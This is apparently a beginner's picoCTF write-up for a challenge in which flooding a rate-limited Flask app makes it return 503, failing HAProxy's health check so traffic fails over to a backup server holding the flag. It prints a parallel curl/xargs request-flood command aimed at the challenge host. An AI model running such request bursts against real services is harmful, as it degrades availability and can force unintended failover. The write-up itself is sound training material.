# Failure Failure | picoCTF 2026

| **Platform**   | CyLab Security Academy |
| -------------- | ---------------------- |
| **Category**   | General Skills         |
| **Difficulty** | Medium                 |

## Overview

This was my first day on CyLab Security Academy and my first Medium CTF.

The challenge provides a web instance along with two files:

```text
app.py
haproxy.cfg
```

The goal is to make the primary backend fail its HAProxy health check so that the backup server is used instead.

## Looking at `app.py`

The first interesting part I found was the rate limit:

```python
@limiter.limit("300 per minute")
```

There is also a custom handler for when the limit is exceeded:

```python
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503
```

So once the rate limit is reached, the application returns `503` instead of the usual `429`.

## Looking at `haproxy.cfg`

The important part was:

```text
option httpchk GET /
http-check expect status 200
server s1 *:8000 check inter 2s fall 2 rise 3
server s2 *:9000 check backup inter 2s fall 2 rise 3
```

HAProxy checks `/` and expects a `200 OK` response.

`s1` is the main backend, while `s2` is configured as the backup.

The important part here is:

```text
http-check expect status 200
```

and:

```text
fall 2
```

If `s1` starts returning something other than `200`, the health check fails. Two consecutive failures are enough for HAProxy to mark `s1` as down, after which `s2` can take over.

Combining both files gave me the idea:

```text
Exceed rate limit
s1 starts returning 503
HAProxy health checks fail
s1 gets marked down
s2 becomes active
```

The backup application also explains why this matters:

```python
if os.getenv("IS_BACKUP") == "yes":
    flag = os.getenv("FLAG")
else:
    flag = "No flag in this service"
```

So the flag is available on the backup service.

## Exploitation

### First attempt

I initially tried a normal Bash loop:

```bash
for i in {1..310}; do
    curl -s http://mysterious-sea.picoctf.net:PORT/ > /dev/null
done
```

This sends the requests sequentially, so it wasn't fast enough to reliably trigger the rate limit in the way I needed.

### Working approach

I used `xargs` to run the requests concurrently:

```bash
seq 1 360 | xargs -n1 -P60 -I{} curl -s -o /dev/null http://mysterious-sea.picoctf.net:PORT/
```

The useful parts of the command are:

```text
seq 1 360
```

Generates 360 inputs.

```text
-n1
```

Makes each input a separate command.

```text
-P60
```

Allows up to 60 commands to run at the same time.

The request itself was kept quiet with:

```text
-s -o /dev/null
```

so I didn't have 360 HTML responses filling the terminal.

After the burst triggered the rate limit, I waited a few seconds for HAProxy to register the failed health checks.

Then I requested the target again:

```bash
curl -i http://mysterious-sea.picoctf.net:PORT/
```

The request was now handled by the backup server, which returned the flag.

## Takeaway

The interesting part of this challenge wasn't simply the rate limit.

The rate limiter caused the primary server to return `503`, while HAProxy was configured to consider only `200` a successful health check. That made the load balancer treat the primary as unhealthy and fail over to the backup server.

This was my first day doing CTFs, so this challenge was also my first time dealing with HAProxy and `xargs` in this kind of setup.
